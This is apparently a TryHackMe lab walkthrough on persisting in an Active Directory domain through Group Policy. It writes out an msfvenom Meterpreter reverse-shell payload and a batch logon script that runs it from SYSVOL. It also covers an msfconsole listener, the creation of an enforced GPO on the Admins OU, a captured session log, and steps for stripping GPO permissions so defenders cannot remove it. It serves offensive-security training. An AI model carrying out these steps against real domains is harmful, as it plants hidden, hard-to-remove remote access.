# Persistence Through Group Policy Objects (GPOs)

The last persistence technique we will review is persistence through Group Policy Objects (GPOs). By now, you should be familiar with GPOs from previous enumeration, attack, and exploitation techniques. GPOs are also excellent for deploying persistence.

Group Policy Management in Active Directory provides a central mechanism to manage the local policy configuration of all domain-joined machines. This includes settings such as restricted group membership, firewall and AV configuration, and startup scripts. While this is a powerful management tool, attackers can abuse it to deploy persistence across the entire estate. Attackers can even hide GPOs to make them almost impossible to remove.

---

## Domain-Wide Persistence

Common GPO persistence techniques include:

- **Restricted Group Membership:** Grants administrative access to all hosts in the domain.
- **Logon Script Deployment:** Ensures a shell callback every time a user authenticates to a host in the domain.

There are many hooks that can be deployed via GPOs. Since we already used Restricted Group Membership in a previous room, let's focus on Logon Script Deployment. This method is especially effective when administrators are actively working on hosts. We'll create a GPO linked to the Admins OU, allowing us to get a shell on a host whenever an admin authenticates.

---

## Preparation

Before creating the GPO, we need to prepare our shell, listener, and the batch file that will execute our shell.

1. **Generate a shell executable:**

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe
    ```

    > Replace `<username>` with your username to avoid overwriting other users' shells.

2. **Create a batch script** (`<username>_script.bat`) to copy and execute the shell:

    ```batch
    copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe
    ```

    This script copies the binary from SYSVOL to the local machine, waits 20 seconds, then executes it.

3. **Copy both files to the SYSVOL directory using SCP and Administrator credentials:**

    ```bash
    $thm scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
    $thm scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
    ```

4. **Start the MSF listener:**

    ```bash
    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445; exploit"
    ```

---

## GPO Creation

1. **Open Group Policy Management as Domain Admin:**
    - In a runas-spawned terminal, type `MMC` and press Enter.
    - Go to `File` → `Add/Remove Snap-in...`
    - Select `Group Policy Management` and click `Add`, then `OK`.

2. **Create and Link a New GPO:**
    - Right-click the Admins OU and select **Create a GPO in this domain, and Link it here**.
    - Name the GPO (e.g., `<username> - persisting GPO`).
    - Right-click your policy and select **Enforced**.

3. **Edit the GPO:**
    - Right-click your policy and select **Edit**.
    - Under **User Configuration**, expand `Policies` → `Windows Settings`.
    - Select **Scripts (Logon/Logoff)**.
    - Right-click **Logon** → **Properties**.
    - Go to the **Scripts** tab, click **Add** → **Browse**.
    - Select your batch file and click **Open** and **OK**.
    - Click **Apply** and **OK**.

Now, every time an administrator logs into any machine, you will get a callback.

---

## Testing the Persistence

- Reset the password for a Tier 1 administrator account and authenticate to a server.
- Start your MSF multi-handler.
- RDP into `THMSERVER1` or `THMSERVER2` using Tier 1 admin credentials.
- After a minute, you should get a callback:

    ```
    msf5 exploit(multi/handler) > run 
    Started reverse TCP handler on 172.31.16.251:4445 

    [*] Sending stage (176195 bytes) to 172.31.1.201 
    [*] Meterpreter session 1 opened (172.31.16.251:4445 -> 172.31.1.201:63695) at 2022-05-07 10:06:28 +0100 

    meterpreter >
    ```

> **Note:** To trigger the GPO, you must generate a Logon event. Signing out (not just disconnecting) will ensure this.

---

## Hiding in Plain Sight

To prevent the blue team from removing your persistence:

1. In MMC, select your policy and go to **Delegation**.
2. Remove permissions for all groups except **Authenticated Users**:
    - Right-click **ENTERPRISE DOMAIN CONTROLLERS** and select **Edit settings, delete, modify security**.
    - Remove all other groups except **Authenticated Users**.
3. Click **Advanced** and remove **Created Owner** from permissions.

By default, **Authenticated Users** must have read access for the policy to apply. If you want to further restrict access:

- Add **Domain Computers** with **Read** permissions.
- Remove **Authenticated Users**.

> **Warning:** Removing Authenticated Users may prevent your shell from executing. Test before making this change.

After these steps, even administrators cannot easily remove the GPO without impersonating a Domain Controller machine account. The GPO will persist until a network reset is performed.

---

You can verify the GPO is still applied by RDPing into one of the THMSERVERS.
